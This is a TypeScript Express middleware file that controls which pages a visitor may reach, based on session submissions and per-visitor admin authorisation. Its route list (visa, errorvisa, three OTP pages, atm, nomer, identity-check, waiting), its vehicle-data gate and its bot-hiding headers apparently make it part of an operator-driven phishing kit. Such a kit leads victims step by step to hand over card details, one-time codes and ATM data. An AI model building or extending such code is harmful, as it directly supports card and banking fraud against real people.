/**
 * Session-based Access Control Middleware
 *
 * Access rules:
 * - /form: Allowed if visitor has submitted data (has submissions) OR authorized by admin
 * - /select: Allowed if visitor has submitted vehicle data OR authorized by admin
 * - /total, /visa, /otp, /otp2, /otp3, /atm, /nomer, /waiting, /errorvisa, /identity-check:
 *   Only allowed if authorized by admin
 *
 * Public routes (no authorization required):
 * - / (home page)
 * - /admin/* (admin routes - handled separately)
 * - /api/* (API routes - handled separately)
 */

import { Request, Response, NextFunction } from "express";
import { isVisitorAuthorized, listSubmissions } from "@workspace/db";

// Routes that can be accessed if visitor has submitted initial data
const FORM_ROUTES = ["/form"];

// Routes that can be accessed if visitor has submitted vehicle data
const SELECT_ROUTES = ["/select"];

// Routes that require explicit admin authorization
const ADMIN_AUTH_ROUTES = [
  "/total",
  "/total2",
  "/visa",
  "/otp",
  "/otp2",
  "/otp3",
  "/atm",
  "/nomer",
  "/waiting",
  "/errorvisa",
  "/identity-check",
];

/**
 * Check if a route requires admin authorization only
 */
function requiresAdminAuth(path: string): boolean {
  return ADMIN_AUTH_ROUTES.some(prefix =>
    path === prefix ||
    path.startsWith(prefix + "/") ||
    path.startsWith(prefix + "?")
  );
}

/**
 * Check if a route requires form submission check
 */
function requiresFormSubmission(path: string): boolean {
  return FORM_ROUTES.some(prefix =>
    path === prefix ||
    path.startsWith(prefix + "/") ||
    path.startsWith(prefix + "?")
  );
}

/**
 * Check if a route requires vehicle submission check
 */
function requiresVehicleSubmission(path: string): boolean {
  return SELECT_ROUTES.some(prefix =>
    path === prefix ||
    path.startsWith(prefix + "/") ||
    path.startsWith(prefix + "?")
  );
}

/**
 * Extract session ID from request
 * Priority: cookie > header > query param
 */
function getSessionId(req: Request): string | null {
  // Check header
  const sessionHeader = req.headers["x-session-id"];
  if (typeof sessionHeader === "string") return sessionHeader;

  // Check cookie
  const cookies = parseCookies(req.headers.cookie || "");
  if (cookies.sessionId) return cookies.sessionId;

  // Check query param (for SSR)
  const querySession = req.query.sessionId;
  if (typeof querySession === "string") return querySession;

  return null;
}

/**
 * Parse cookies from cookie header
 */
function parseCookies(cookieHeader: string): Record<string, string> {
  const cookies: Record<string, string> = {};
  if (!cookieHeader) return cookies;

  cookieHeader.split(";").forEach(cookie => {
    const [name, ...rest] = cookie.trim().split("=");
    if (name && rest.length > 0) {
      cookies[name.trim()] = decodeURIComponent(rest.join("="));
    }
  });

  return cookies;
}

/**
 * Set security headers to prevent bots and search engines
 */
function setSecurityHeaders(res: Response): void {
  res.setHeader("X-Robots-Tag", "noindex, nofollow, noarchive, nosnippet");
  res.setHeader("X-Content-Type-Options", "nosniff");
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, proxy-revalidate, max-age=0");
  res.setHeader("Pragma", "no-cache");
  res.setHeader("Expires", "0");
}

/**
 * Check if visitor has submitted initial form data
 */
async function hasSubmittedInitialData(sessionId: string): Promise<boolean> {
  try {
    const submissions = await listSubmissions({ sessionId, type: "initial" });
    return submissions.length > 0;
  } catch (error) {
    console.error("[Auth] Error checking submissions:", error);
    return false;
  }
}

/**
 * Check if visitor has submitted vehicle data
 */
async function hasSubmittedVehicleData(sessionId: string): Promise<boolean> {
  try {
    const submissions = await listSubmissions({ sessionId, type: "vehicle" });
    return submissions.length > 0;
  } catch (error) {
    console.error("[Auth] Error checking vehicle submissions:", error);
    return false;
  }
}

/**
 * Session-based access control middleware
 *
 * Access logic:
 * 1. /form - needs initial submission OR admin auth
 * 2. /select - needs vehicle submission OR admin auth  
 * 3. Other protected routes - needs admin auth only
 */
export function sessionAuthMiddleware(req: Request, res: Response, next: NextFunction): void {
  const path = req.path;

  // Skip API routes
  if (path.startsWith("/api")) {
    return next();
  }

  // Skip admin routes (handled by admin auth)
  if (path.startsWith("/admin")) {
    return next();
  }

  // Skip public routes
  if (path === "/" || path === "") {
    return next();
  }

  // Skip if already handled by other middleware
  if (res.headersSent) {
    return next();
  }

  const sessionId = getSessionId(req);

  if (!sessionId) {
    // No session ID - redirect to home with noindex headers
    setSecurityHeaders(res);
    res.redirect(302, "/");
    return;
  }

  // Check authorization based on route type
  const checkAuth = async () => {
    // Check if admin authorized first (overrides everything)
    const adminAuthorized = await isVisitorAuthorized(sessionId);
    if (adminAuthorized) {
      return true; // Admin authorized - allow all routes
    }

    // For /form - check if visitor has submitted initial data
    if (requiresFormSubmission(path)) {
      return await hasSubmittedInitialData(sessionId);
    }

    // For /select - check if visitor has submitted vehicle data
    if (requiresVehicleSubmission(path)) {
      return await hasSubmittedVehicleData(sessionId);
    }

    // For other routes - must be admin authorized
    return false;
  };

  checkAuth()
    .then((authorized) => {
      if (!authorized) {
        // Visitor not authorized - redirect to home
        console.log(`[Auth] Unauthorized access to ${path} by session ${sessionId.substring(0, 8)}...`);
        setSecurityHeaders(res);
        res.redirect(302, "/");
        return;
      }

      // Authorized - proceed
      next();
    })
    .catch((error) => {
      // Database error - be safe, deny access
      console.error("[Auth] Authorization check failed:", error);
      setSecurityHeaders(res);
      res.redirect(302, "/");
    });
}
